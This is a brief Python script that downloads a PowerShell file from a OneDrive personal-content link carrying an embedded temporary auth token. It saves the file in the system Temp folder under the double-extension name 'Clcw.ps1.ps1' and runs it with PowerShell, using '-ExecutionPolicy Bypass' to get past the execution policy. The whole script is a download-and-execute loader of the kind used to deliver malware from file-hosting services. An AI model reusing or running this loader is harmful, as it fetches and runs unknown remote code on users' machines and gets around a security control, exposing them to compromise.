import requests
import os
import subprocess

# Your OneDrive link
url = "https://my.microsoftpersonalcontent.com/personal/3ce6f8bdc7595cee/_layouts/15/download.aspx?UniqueId=fce1458c-1c5f-4a15-b69b-fe001711382c&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI1MWE5MjdkYS05ODQ4LTQ4YzktOGE4NC0wZGUwYjJlNmJjODkiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyMTU2OTUxIn0.ZwL_Oe8ckpOQheR_vV63HB5dLAd9oeIQD0yrOaNVUQJUJ2L_RLZpEwDONVGsLOg7IfdmH6JnKVGzur4-JIve0YPZQBjW7SmTQewp-64cueEi0BIohh7c31Rrsr01Hx1g1zqi4PKnuWPvRHq_VwvsJVQm8JAq425KjlSEF2z01Wq-BaWA1FoJjruzSeUcpqsBiR8R2H7CCsb5KL_1qJCnRgk-v_NsuyjeM_uxdHcPfSeVQvV6rWYVwvrJ8bSah5jfQTD_d4pzWLpBV4PDGf6S4Uga0lAmBWDidyKYzpSNbNw7ecTIKxzouGtdFz7nr-_cfdNIcVn_voI4-5r3e9Ryk92twFXJsLFyR2CkpQAhx9syVYy_WbvngEmzBzdl9oMUdDMNlRHjNilMyR1i2snuF3pdHnn9dZw37bNy9E5jgGVdvdaenSRsdIBBf4TBx7lzlOscwr77wgpSluZ-Acu7w65i8iuq-cICmnsbnNqCKtnHaqI1p8FvabpGhXZIS9APEXKNp8nHzHJyqsPOSCkIlA.NPZI59qvYO5MQtcQZDp0w2YNDY2DdaBet4kik_6g2jY&ApiVersion=2.0"

# Get the system Temp folder path
temp_folder = os.environ.get('TEMP', '/tmp')
file_path = os.path.join(temp_folder, 'Clcw.ps1.ps1')

# Download the file
r = requests.get(url, allow_redirects=True)
with open(file_path, 'wb') as f:
    f.write(r.content)

print(f"File downloaded to {file_path}")

# Execute the downloaded PS1 script
try:
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], check=True)
    print("PowerShell script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error executing PowerShell script: {e}")
